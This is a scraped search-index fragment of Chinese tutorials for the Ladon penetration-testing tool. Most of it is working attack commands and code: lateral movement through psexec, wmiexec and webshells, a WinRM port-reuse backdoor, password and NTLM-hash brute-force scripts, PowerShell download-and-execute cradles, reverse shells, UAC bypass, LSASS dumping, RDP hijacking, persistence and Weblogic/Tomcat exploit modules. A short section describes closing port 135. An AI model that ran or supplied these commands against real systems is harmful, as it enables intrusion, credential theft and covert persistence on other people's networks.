Ladon whoami 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon远程命令执行Wmiexec/psexec/atexec/psexec/webshell","date":"2020-05-21T15:20:00.000Z","updated":"2020-08-01T16:29:34.744Z","comments":true,"path":"Ladon/WinShell.html","permalink":"http://k8gege.org/Ladon/WinShell.html","excerpt":"","text":"前言在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。 Ladon远程执行命令PSEXEC交互式回显需先连接IPC，然后再通过psexec执行命令，类似psexec需445端口 1234net user \\\\192.168.1.8 k8gege520 /user:k8gegeLadon psexec 192.168.1.8psexec&gt; whoamint authority\\system WmiExec非交互回显并非所有机器都允许连接445端口，所以可通过135端口执行命令 1Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami AtExec非交互回显通过sctask命令执行，可以SYSTEM权限或对应用户执行命令，需445端口但是以用户权限执行命令需要远程机器登陆对应用户 1Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami SshExec非交互回显一般开放SSH服务的有Linux系统，网络设备等，默认为22端口 12Ladon SshExec 192.168.1.8 k8gege k8gege520 whoamiLadon SshExec 192.168.1.8 22 k8gege k8gege520 whoami JspShell非交互回显支持菜刀以及Ladon自动GetShell时传的UAshell，详见：http://k8gege.org/p/ladon_cs_shell.html 12Usage：Ladon JspShell type url pwd cmdExample: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami WebShell非交互回显支持7种脚本(jsp asp php aspx cfm py perl)，3种类型WebShell(cd ua k8)支持菜刀以及Ladon自动GetShell时传的UAshell，详见：http://k8gege.org/p/ladon_cs_shell.html 1234Usage：Ladon WebShell ScriptType ShellType url pwd cmdExample: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoamiExample: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoamiExample: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"Winrm远程命令/端口复用后门/WinrmCmd/密码爆破","date":"2020-05-18T14:10:00.000Z","updated":"2020-08-01T16:24:58.296Z","comments":true,"path":"Ladon/WinrmScan.html","permalink":"http://k8gege.org/Ladon/WinrmScan.html","excerpt":"","text":"简介WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。 Server2008R2及往上的系统中默认中都开启该服务，从Server2012系统后开始，该WinRM服务便被设置为默认开启。Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认开启WinRM服务。 PS：WIN7或2008需要手动开户WINRM 默认端口5985/tcp (HTTP)5986/tcp (HTTPS) 快速启动WinRM1winrm quickconfig -q 或 winrm qc 端口复用后门对于Windows Server 2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。通过下面的命令，可以新增WinRM一个80端口的监听。 1winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=\"true\"&#125; PS：该方法适用于有web的机器，不会开启新端口，也不需要新的EXE进程或DLL劫持。 Winrs远程执行命令需要客户端启用Winrm，SYS权限受限制 客户端启用Winrmwinrm quickconfig -qwinrm set winrm/config/Client @{TrustedHosts=”*”} 远程执行CMD通过Winrs连接，并执行whoami命令 1winrs -r:http://192.168.1.20 -u:k8gege -p:k8gege520 whoami 通过Winrs连接，并获得交互式的shell 1winrs -r:http://192.168.1.20 -u:k8gege -p:k8gege520 cmd PowerShell远程执行命令需要客户端启用Winrm，和系统自带命令一样,SYS权限受限制 1234567$ip=\"192.168.1.116\"#$ip=\"192.168.1.20\"Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value $ip -Force$securePassword = ConvertTo-SecureString -AsPlainText -Force 'k8gege520' $cred = New-Object System.Management.Automation.PSCredential 'k8gege', $securePassword$cmd = &#123;ls C:\\users\\public&#125;Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock $cmd Pywinrm远程执行命令需要客户端启用Winrm，和系统自带命令一样,SYS权限受限制 123456789#C:\\Users\\null\\Desktop\\pywinrm&gt;python test1.py#win-\\k8gegeimport winrms=winrm.Session('http://192.168.1.116',auth=('k8gege','k8gege520'))#2012 ok#s=winrm.Session('http://192.168.1.20',auth=('k8gege','k8gege520'))#win7 failr=s.run_ps('dir')r=s.run_cmd('whoami') print r.std_out print r.std_err Gowinrm远程执行命令Go版不受权限限制，也不需要客户端启用Winrm，也不像系统自带winrs编码限制推荐使用版本，跨平台，任意权限，工具无需系统客外配置，也无需复杂安装。 1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( \"github.com/masterzen/winrm\" \"fmt\" \"os\" \"strconv\")//Winrm Remote Shell by k8gege//http://k8gege.org/Ladon/WinrmScan.html#C:\\Users\\k8gege\\Desktop\\&gt;winrmcmd.exe 192.168.1.116 5985 k8gege k8gege520 whoami#k8gegevar help = func () &#123; fmt.Println(\"Winrm Shell by k8gege\") fmt.Println(\"====================================================\") fmt.Println(\"winrmcmd host port user pass cmd\")&#125;func main() &#123; args := os.Args if len(args) &lt; 5 || args == nil &#123; help() return &#125; host := args[1] port,err := strconv.Atoi(args[2]) user := args[3] pass := args[4] cmd := args[5] endpoint := winrm.NewEndpoint(host, port, false, false, nil, nil, nil, 0) client, err := winrm.NewClient(endpoint, user, pass) if err != nil &#123; panic(err) &#125;client.Run(cmd, os.Stdout, os.Stderr)&#125; C#版远程执行命令有两种方法，一种WSMAN，一种DCOM，都有缺限，一个在WIN7环境运行提示无效程序（在2012系统才正常）,另一个在WIN7开发环境正常在2012系统不能使用，再者需启用Winrm还一样受权限限制，还不如用系统自带命令好。 调用winrm爆破由于C#使用WSMan来访问winrm均在各种问题，还不如系统自带命令winrs。当前机器为中文，目标为英文系统，连接提示编码问题，设置对应编码即可其它语言系统，返回不一定是437，具体自行根据需要修改INI脚本。 PS：GO版不受权限限制，也不受编码限制，建立使用GO版验证密码 WinrmScan.ini123456789[Ladon]#Brute-Force WinRMexe=cmd.exearg=/c \"chcp 437 &amp; winrs -r:http://$ip$:5985 -u:$user$ -p:$pass$ \"echo isok\"\"#exe=WinrmScan.exe#arg=$ip$ $user$ $pass$port=5985isok=isoklog=true 注意：INI脚本必须为ANSI编码，当前机器与目标必须启用WINRM，且放行5985端口后门：如果被别人添加了复用后门，也可以直接爆破80端口，把5985改成80即可。 调用WinrmCmd爆破Go版不受权限限制，也不需要客户端启用Winrm，也不像系统自带winrs编码限制 12345678[Ladon]#Brute-Force WinRMexe=winrmcmd.exearg=$ip$ 5985 $user$ $pass$ \"echo isok\"\"#exe=WinrmScan.exe#arg=$ip$ $user$ $pass$isok=isoklog=true Winrm密码爆破/暴力破解配置密码爆破参数INI脚本仅支持标准的user.txt和pass.txt帐密破解 user &amp; pass /传统帐密user.txtk8gegeroot pass.txttoork8gege520 指定IP1Ladon 192.168.1.8 WinrmScan.ini 扫描C段12Ladon 192.168.1.8/c WinrmScan.iniLadon 192.168.1.8/24 WinrmScan.ini 扫描B段1Ladon 192.168.1.8/b WinrmScan.ini 扫描A段1Ladon 192.168.1.8/a WinrmScan.ini 批量IPip.txt192.168.1.8192.168.1.5192.168.1.109:48 1Ladon WinrmScan.ini 批量C段ip24.txt192.168.1.10.1.5. 1Ladon WinrmScan.ini 批量B段ip16.txt192.168.10.1. 1Ladon WinrmScan.ini 如图，通过5985端口扫描1.20机器登陆口令 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releasesWinrmCmd: https://github.com/k8gege/WinrmCmd"},{"title":"WmiHashScan 135端口WMI NTLM HASH密码爆破","date":"2020-07-04T09:30:00.000Z","updated":"2020-08-01T16:27:37.909Z","comments":true,"path":"Ladon/WmiHashScan.html","permalink":"http://k8gege.org/Ladon/WmiHashScan.html","excerpt":"","text":"Ladon445端口 Wmi密码爆破(Windows)Ladon 192.168.1.8/24 WmiScan 445端口 Wmi NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 WmiHashScan PowerLadon远程加载WmiScan 445端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 WmiScan” 远程加载WmiHash爆破内网主机（NtlmHash）powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.40 WmiHash” 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"WmiScan 135端口弱口令/WMI密码爆破","date":"2020-07-04T09:30:00.000Z","updated":"2020-08-01T16:27:24.228Z","comments":true,"path":"Ladon/WmiScan.html","permalink":"http://k8gege.org/Ladon/WmiScan.html","excerpt":"","text":"Ladon445端口 Wmi密码爆破(Windows)Ladon 192.168.1.8/24 WmiScan 445端口 Wmi NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 WmiHashScan PowerLadon远程加载WmiScan 445端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 WmiScan” 远程加载WmiHash爆破内网主机（NtlmHash）powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.40 WmiHash” 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"Ladon枚举远程主机网卡信息(OXID定位多网卡主机)","date":"2020-07-17T12:45:00.000Z","updated":"2020-08-01T16:25:21.011Z","comments":true,"path":"Ladon/ethscan.html","permalink":"http://k8gege.org/Ladon/ethscan.html","excerpt":"","text":"前言OXID Resolver是在支持COM +的每台计算机上运行的服务。它执行两项重要职责：存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。将ping消息发送到本地计算机具有客户端的远程对象，并接收在本地计算机上运行的对象的ping消息。 我们只需要向远程主机发以下两个包，再解析返回结果即可。 1234567891011121314151617181920 static byte[] s1 =&#123;0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0xb8,0x10,0xb8,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a,0x00,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00 &#125;; static byte[] s2 =&#123;0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00 &#125;; 程序版本Ladon &gt;=7.0 模块名称EthScanOxidScan 模块说明通过Windows的一些DCOM接口进行网卡进行信息枚举，定位多网卡主机，在无权限的情况下得知远程主机是否含有内网甚至VPN;当然也可以判定Windows主机,K8抓包发现xp和03系统有一段相同特征，WIN7-WIN10等也是相同特征，所以可区分是否WIN7以上系统。 前提条件1.Windows主机2.开放135端口3.DCOM&gt;=5.6（老外原文说5.6版本才可用，可能他写错了）4.dcomcnfg配置中的“面向连接的TCP/IP”协议没有被移除 PS: 由于有一定条件限制，若该模块无法定位多网卡主机，也可使用OnlinePC、OsScan、WebScan、WhatCMS等模块探测，如多个IP同一个机器名，网样的网站标题，或同样的网卡MAC地址，也可定位多网卡主机，只是没有通过该方法好，毕竟一个是100%，一个是90%，比如负载均横同样的网站却不在同一台机器上。 测试系统测试XP/Win7/Win8/Win10,2003/2008/2012均成功，2016和2019无环境未测，应该支持。 EthScan模块用法扫描指定主机Ladon 192.168.1.8 EthScan 扫描C段主机Ladon 192.168.1.8/24 EthScanLadon 192.168.1.8/C EthScan 批量扫描IP列表主机ip.txt里放需要扫描的IP，使用以下命令即可Ladon EthScan 批量检测IP段（/24）ip24.txt里放需要扫描的IP段，使用以下命令即可Ladon EthScan 批量检测IP段（/16）ip16.txt里放需要扫描的IP段，使用以下命令即可Ladon EthScan 关闭135端口防止通过135网卡探测运行dcomcnfg，打开“组件服务”→“计算机”，在“我的电脑”上右键点击，选“属性”；然后点默认属性，把“在此计算机上启用分布式COM（E）”的勾去掉，接着返回到“默认协议”，移除“面向连接的TCP/IP”协议。重启后发现135端口还是开放，但已无法探测机器名和网卡，不过WmiScan还可以扫描到密码。 彻底关闭135端口运行regedit，进入注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc右键点击Rpc,新建——项——输入 Internet然后重启，再cmd,输入netstat -an,就发现135端口彻底消失，此时无法枚举网卡信息，也无法WMI扫描密码，无法WMI远程执行等。 PS：由于很多服务是互相依赖的关系，不推荐关闭以免影响系统服务，比如计划任务程序无法正常运行，磁盘碎片整理又依赖计划任务而打不开等。 参考https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/ https://payloads.online/archivers/2020-07-16/1?nsukey=oZl56gbIGgfxQcx%2F0HMnIkDOK1FvyCWabho4pheMAZ8WRjelIN1lFyf%2FmHcseWWhqnr%2FmmH2auwGTJDaANogm5UzmXCLggfgR%2FMkudQEJNkqWUsU6CSgCb%2FzUbrWP8kHd5jW5Ef%2FS7JxhKfzSFOdU7xdbahjeLVqv8CRKy3Wbv1gjhZZNsh6HJYxmWJ0AjK6mrrPaBaTRWg1zswyqwb1ng%3D%3D 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"Ladon & Cobalt Strike简明教程","date":"2020-05-31T06:30:00.000Z","updated":"2020-08-01T16:24:19.292Z","comments":true,"path":"Ladon/example.html","permalink":"http://k8gege.org/Ladon/example.html","excerpt":"","text":"前言本文仅是Ladon简单使用例子，Cobalt Strike、PowerShell、KaliLadon跨平台版等用法一致。 完整文档：http://k8gege.org/Ladon Socks5代理扫描例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）Ladon noping 10.1.2.8/24 MS17010 详见：http://k8gege.org/Ladon/proxy.html 资产扫描、指纹识别、服务识别、存活主机、端口扫描001 多协议探测存活主机 （IP、机器名、MAC地址、制造商）Ladon 192.168.1.8/24 OnlinePC 002 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）Ladon 192.168.1.8/24 OsScan 003 扫描存活主机Ladon 192.168.1.8/24 OnlineIP 004 ICMP扫描存活主机Ladon 192.168.1.8/24 Ping 005 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）Ladon 192.168.1.8/24 MS17010 006 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）Ladon 192.168.1.8/24 SMBGhost 007 扫描Web信息/Http服务Ladon 192.168.1.8/24 WebScan 008 扫描C段站点URL域名Ladon 192.168.1.8/24 UrlScan 009 扫描C段站点URL域名Ladon 192.168.1.8/24 SameWeb 010 扫描子域名、二级域名Ladon baidu.com SubDomain 011 域名解析IP、主机名解析IPLadon baidu.com DomainIPLadon baidu.com HostIP 012 域内机器信息获取Ladon AdiDnsDump 192.168.1.8 （Domain IP） 013 扫描C段端口、指定端口扫描Ladon 192.168.1.8/24 PortScanLadon 192.168.1.8 PortScan 80,445,3389 014 扫描C段WEB以及CMS（75种Web指纹识别）Ladon 192.168.1.8/24 WhatCMS 015 扫描思科设备Ladon 192.168.1.8/24 CiscoScanLadon http://192.168.1.8 CiscoScan 016 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）Ladon EnumMssql 017 枚举网络共享资源 （域、存活IP、共享路径）Ladon EnumShare 018 扫描LDAP服务器Ladon 192.168.1.8/24 LdapScan 019 扫描FTP服务器Ladon 192.168.1.8/24 FtpScan 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆密码爆破详解参考SSH：http://k8gege.org/Ladon/sshscan.html 020 445端口 SMB密码爆破(Windows)Ladon 192.168.1.8/24 SmbScan 021 135端口 Wmi密码爆破(Windowns)Ladon 192.168.1.8/24 WmiScan 022 389端口 LDAP服务器、AD域密码爆破(Windows)Ladon 192.168.1.8/24 LdapScan 023 5985端口 Winrm密码爆破(Windowns)Ladon 192.168.1.8/24 WinrmScan.ini 024 445端口 SMB NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 SmbHashScan 025 135端口 Wmi NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 WmiHashScan 026 22端口 SSH密码爆破(Linux)Ladon 192.168.1.8/24 SshScanLadon 192.168.1.8:22 SshScan 027 1433端口 Mssql数据库密码爆破Ladon 192.168.1.8/24 MssqlScan 028 1521端口 Oracle数据库密码爆破Ladon 192.168.1.8/24 OracleScan 029 3306端口 Mysql数据库密码爆破Ladon 192.168.1.8/24 MysqlScan 030 7001端口 Weblogic后台密码爆破Ladon http://192.168.1.8:7001/console WeblogicScanLadon 192.168.1.8/24 WeblogicScan 031 5900端口 VNC远程桌面密码爆破Ladon 192.168.1.8/24 VncScan 032 21端口 Ftp服务器密码爆破Ladon 192.168.1.8/24 FtpScan 033 8080端口 Tomcat后台登陆密码爆破Ladon 192.168.1.8/24 TomcatScanLadon http://192.168.1.8:8080/manage TomcatScan 034 Web端口 401基础认证密码爆破Ladon http://192.168.1.8/login HttpBasicScan 035 445端口 Impacket SMB密码爆破(Windowns)Ladon 192.168.1.8/24 SmbScan.ini 036 445端口 IPC密码爆破(Windowns)Ladon 192.168.1.8/24 IpcScan.ini 漏洞检测/漏洞利用/Poc/Exp037 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144)Ladon 192.168.1.8/24 MS17010 038 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)Ladon 192.168.1.8/24 WeblogicPoc 039 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)Ladon 192.168.1.8/24 PhpStudyPoc 040 ActiveMQ漏洞检测(CVE-2016-3088)Ladon 192.168.1.8/24 ActivemqPoc 041 Tomcat漏洞检测(CVE-2017-12615)Ladon 192.168.1.8/24 TomcatPoc 042 Weblogic漏洞利用(CVE-2019-2725)Ladon 192.168.1.8/24 WeblogicExp 043 Tomcat漏洞利用(CVE-2017-12615)Ladon 192.168.1.8/24 TomcatExp 044 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)Ladon 192.168.1.8/24 Struts2Poc FTP下载、HTTP下载045 HTTP下载Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar 046 Ftp下载Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe 加密解密(HEX/Base64)047 Hex加密解密Ladon 123456 EnHexLadon 313233343536 DeHex 048 Base64加密解密Ladon 123456 EnBase64Ladon MTIzNDU2 DeBase64 网络嗅探049 Ftp密码嗅探Ladon FtpSniffer 192.168.1.5 050 HTTP密码嗅探Ladon HTTPSniffer 192.168.1.5 051 网络嗅探Ladon Sniffer 密码读取052 读取IIS站点密码、网站路径Ladon IISpwd DumpLsass内存密码Ladon DumpLsass 信息收集053 进程详细信息Ladon EnumProcessLadon Tasklist 054 获取命令行参数Ladon cmdlineLadon cmdline cmd.exe 055 获取渗透基础信息Ladon GetInfoLadon GetInfo2 056 .NET &amp; PowerShell版本Ladon NetVerLadon PSverLadon NetVersionLadon PSversion 057 运行时版本&amp;编译环境Ladon VerLadon Version 远程执行(psexec/wmiexec/atexec/sshexec)445端口 PSEXEC远程执行命令（交互式）net user \\192.168.1.8 k8gege520 /user:k8gegeLadon psexec 192.168.1.8psexec&gt; whoamint authority\\system 058 135端口 WmiExec远程执行命令 （非交互式）Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami 059 445端口 AtExec远程执行命令（非交互式）Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami 060 22端口 SshExec远程执行命令（非交互式）Ladon SshExec 192.168.1.8 k8gege k8gege520 whoamiLadon SshExec 192.168.1.8 22 k8gege k8gege520 whoami 061 JspShell远程执行命令（非交互式）Usage：Ladon JspShell type url pwd cmdExample: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami 062 WebShell远程执行命令（非交互式）1234Usage：Ladon WebShell ScriptType ShellType url pwd cmdExample: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoamiExample: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoamiExample: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami 提权降权063 BypassUac 绕过UAC执行,支持Win7-Win10Ladon BypassUac c:\\1.exeLadon BypassUac c:\\1.bat 064 GetSystem 提权或降权运行程序Ladon GetSystem cmd.exeLadon GetSystem cmd.exe explorer 065 Runas 模拟用户执行命令Ladon Runas user pass cmd 其它功能066 一键启用.net 3.5Ladon EnableDotNet 067 获取内网站点HTML源码Ladon gethtml http://192.168.1.1 068 检测后门Ladon CheckDoorLadon AutoRun 069 获取本机内网IP与外网IPLadon GetIP 070 一键迷你WEB服务器Ladon WebSer 80Ladon web 80 反弹Shell071 反弹TCP NC ShellLadon ReverseTcp 192.168.1.8 4444 nc 072 反弹TCP MSF ShellLadon ReverseTcp 192.168.1.8 4444 shell 073 反弹TCP MSF MET ShellLadon ReverseTcp 192.168.1.8 4444 meter 074 反弹HTTP MSF MET ShellLadon ReverseHttp 192.168.1.8 4444 075 反弹HTTPS MSF MET ShellLadon ReverseHttps 192.168.1.8 4444 076 反弹TCP CMD &amp; PowerShell ShellLadon PowerCat 192.168.1.8 4444 cmdLadon PowerCat 192.168.1.8 4444 psh 077 反弹UDP Cmd &amp; PowerShell ShellLadon PowerCat 192.168.1.8 4444 cmd udpLadon PowerCat 192.168.1.8 4444 psh udp 078 RDP桌面会话劫持（无需密码）Ladon RDPHijack 3Ladon RDPHijack 3 console 079 OXID定位多网卡主机Ladon 192.168.1.8/24 EthScanLadon 192.168.1.8/24 OxidScan 080 查看用户最近访问文件Ladon Recent 081 添加注册表Run启动项Ladon RegAuto Test c:\\123.exe 082 AT计划执行程序(无需时间)(system权限)Ladon at c:\\123.exeLadon at c:\\123.exe gui 083 SC服务加启动项&amp;执行程序(system权限）Ladon sc c:\\123.exeLadon sc c:\\123.exe guiLadon sc c:\\123.exe auto ServerName 084 MS16135提权Ladon ms16135 whoami 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon探测域名内网IP(只允许域名访问站点)","date":"2020-07-15T12:30:00.000Z","updated":"2020-08-01T16:25:31.885Z","comments":true,"path":"Ladon/hostscan.html","permalink":"http://k8gege.org/Ladon/hostscan.html","excerpt":"","text":"前言在内网渗透中，有时候你会发现有些WEB无法通过IP访问，主要原因是目标对网站进行了域名绑定，尤其是同服上有多个域名站点的。这时候你访问可能报401、403、404等错误，或者也不报错返回IIS或APACHE等默认页面，如果认为目标未搭建网站，则可能因此错过一些存在漏洞的WEB。或者说你已经搞下内网其中一台机器，想通过该机器搞主站，但是使用Ladon的WebScan或WhatCms均未探测到主网IP，原因多半也是网站绑定了域名(IIS设置显示为主机头)，所以本文主要是解决这个问题。 解决方案1.通过修改Hosts文件，绑定IP域名，访问IP看返回页面与目标主站对比。2.访问网站，设置HTTP主机头，访问IP看返回页面与目标主站页面对比。 实战用途1.探测域名对应内网IP2.探测主站绑定多个IP C#代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879namespace hostscan&#123; class Program &#123; &#x2F;&#x2F;hostscan for ladon &#x2F;&#x2F;http:&#x2F;&#x2F;k8gege.org static void Main(string[] args) &#123; string ip &#x3D; &quot;&quot;; &#x2F;&#x2F;string host &#x3D; &quot;qq.com&quot;;&#x2F;&#x2F;扫C段或批量时写目标对应域名 string host &#x3D; &quot;&quot;; &#x2F;&#x2F;不设主机头，默认获取IP对应WEB标题 if (args.Length &#x3D;&#x3D; 1) &#123; ip &#x3D; args[0]; &#125; else if (args.Length &#x3D;&#x3D; 2) &#123; ip &#x3D; args[0]; host &#x3D; args[1]; &#125; else &#123; Console.WriteLine(&quot;hostscan ip&quot;); Console.WriteLine(&quot;hostscan ip domain&quot;); return; &#125; string url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + ip; if (ip.Contains(&quot;http:&#x2F;&#x2F;&quot;) || ip.Contains(&quot;https:&#x2F;&#x2F;&quot;)) url &#x3D; ip; HttpWebRequest req &#x3D; (HttpWebRequest)HttpWebRequest.Create(url); req.Method &#x3D; &quot;GET&quot;; &#x2F;&#x2F;req.ContentLength &#x3D; data.Length; &#x2F;&#x2F;req.ContentType &#x3D; &quot;application&#x2F;x-www-form-urlencoded&quot;; req.ContentType &#x3D; &quot;application&#x2F;octet-stream&quot;; if (host !&#x3D; &quot;&quot;) req.Host &#x3D; host; req.Accept &#x3D; &quot;image&#x2F;gif, image&#x2F;jpeg, image&#x2F;pjpeg, image&#x2F;pjpeg, application&#x2F;x-shockwave-flash, application&#x2F;vnd.ms-excel, application&#x2F;vnd.ms-powerpoint, application&#x2F;msword, application&#x2F;x-silverlight, application&#x2F;vnd.ms-xpsdocument, application&#x2F;x-ms-application, application&#x2F;x-ms-xbap, application&#x2F;xaml+xml, *&#x2F;*&quot;; try &#123; HttpWebResponse response &#x3D; (HttpWebResponse)req.GetResponse(); Stream myResponseStream &#x3D; response.GetResponseStream(); StreamReader myStreamReader &#x3D; new StreamReader(myResponseStream, System.Text.Encoding.Default); string retString &#x3D; myStreamReader.ReadToEnd(); myStreamReader.Close(); myResponseStream.Close(); Console.WriteLine(ip + &quot; &quot; + GetTitle(retString)); &#125; catch (Exception ex) &#123; ; &#125; &#125; private static string GetTitle(string html) &#123; String regex &#x3D; @&quot;&lt;title&gt;.+&lt;&#x2F;title&gt;&quot;; String title &#x3D; Regex.Match(html, regex).ToString(); title &#x3D; Regex.Replace(title, @&quot;[\\&quot;&quot;]+&quot;, &quot;&quot;); return title; &#125; &#125;&#125; 指定主机头访问IP，并获取标题（如果不指定我们将获取不到标题） 12C:\\Users\\k8gege&gt;hostscan 58.250.137.36 qq.com58.250.137.36 &lt;title&gt;腾讯首页&lt;/title&gt; 批量探测显然在不确定是哪个内网IP为主站机器的情况下，一个一个IP试效率就太低了，因此我们需要代码实现自动探测。我们可以获取C段网站标题，然后看哪个IP标题和外网访问时的标题对比，以此确认哪个IP为主站机器，如果做了负载均横或机器有多网卡，则可能有多个IP都为同一标题。 因为是.net程序，所以Ladon可直接加载EXE做为模块扫描，从扫描结果得知，qq.com绑定了多个IP。实战时指定为目标内网IP即可，hostscan.exe域名需写死或通过TXT读取。 1234567891011121314151617181920212223C:\\Users\\k8gege&gt;hostscan 58.250.137.36 qq.com58.250.137.36 &lt;title&gt;腾讯首页&lt;/title&gt;C:\\Users\\k8gege&gt;Ladon40 58.250.137.36/24 hostscan.exeLadon 6.6Start: 2020-07-15 21:42:40Runtime: .net 4.0 OS Arch: x86OS Name: Microsoft Windows 7 旗舰版Call DiyMoudle (c# exe)58.250.137.36/24load hostscan.exe58.250.137.36/24 is Valid CIDRIPCound: 256Scan Start: 2020-07-15 21:42:4058.250.137.100 &lt;title&gt;鑵捐浜戞櫤鏈?涓€閿惌寤轰紒涓氳嚜宸辩殑瀹㈡湇骞冲彴&lt;/title&gt;58.250.137.36 &lt;title&gt;腾讯首页&lt;/title&gt;58.250.137.38 &lt;title&gt;腾讯首页&lt;/title&gt;58.250.137.11658.250.137.12458.250.137.11558.250.137.107 &lt;title&gt;鎶㈡敞QQ绌洪棿涓撳睘鍩熷悕&lt;/title&gt;58.250.137.112 &lt;title&gt;鐧诲綍&lt;/title&gt;58.250.137.101 &lt;title&gt;腾讯首页&lt;/title&gt; 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon IIS站点密码读取","date":"2020-05-30T15:10:00.000Z","updated":"2020-08-01T16:29:09.720Z","comments":true,"path":"Ladon/iispwd.html","permalink":"http://k8gege.org/Ladon/iispwd.html","excerpt":"","text":"EnumIIS IIS站点密码读取获取IIS站点、路径、帐号、密码 12Ladon EnumIISLadon IisPwd 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"Ladon wiki","date":"2020-05-13T09:00:00.000Z","updated":"2020-08-02T09:46:40.458Z","comments":true,"path":"Ladon/index.html","permalink":"http://k8gege.org/Ladon/index.html","excerpt":"","text":"Visit: Ladon完整文档、简明使用教程，含EXE版、PowerShell版、Cobalt Strike版、Linux版 